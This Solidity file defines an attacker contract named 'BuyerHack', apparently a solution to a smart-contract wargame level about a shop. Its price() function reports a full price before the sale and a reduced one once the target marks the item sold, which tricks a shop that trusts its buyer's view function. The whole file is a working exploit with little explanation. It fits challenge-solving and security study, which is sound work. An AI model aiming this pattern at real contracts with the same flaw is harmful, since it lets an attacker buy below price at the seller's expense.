// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ShopI {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external;
}

contract BuyerHack {
    ShopI public shop;

    constructor(address _shop) {
        shop = ShopI(_shop);
    }

    function xcall() public {
        shop.buy();
    }

    function price() public view returns (uint256) {
        return shop.isSold() ? shop.price() - 20 : shop.price();
    }
}
